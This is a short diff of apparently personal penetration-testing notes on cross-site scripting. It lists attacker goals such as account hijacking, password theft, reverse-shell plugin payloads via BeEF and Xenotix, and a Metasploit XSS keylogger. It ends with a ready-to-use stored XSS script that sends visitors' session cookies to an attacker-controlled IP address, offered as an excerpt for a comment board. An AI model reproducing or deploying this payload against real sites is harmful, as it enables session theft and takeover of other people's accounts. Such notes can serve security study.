@@ -4,6 +4,8 @@
 1. Account Hijacking - steal session cookies via Image method below, or other method
 2. Password Theft - See password theft example at the bottom
 3. Unauthorized Action - if a user has knowlege of other functions in javascript that can be performed only by an authorized user, those actions can be taken/manipulated to send sensitive data to the attacker, or perform actions on behalf of the user. 
+4. Download plugins - BeEF and OWASP Xenotix XSS can be used to create payloads for reverse shells that if the user clicks to 'allow plugin', it can execute.
+5. Keylogger - there is a javascript metasploit module for keylogging, that is XSS driven. 
 
 #Stored/persistent excerpt that could be used for comment board or something:
 <script>new Image().src="http://10.11.0.125/bogus.php?output="+document.cookie;</script>
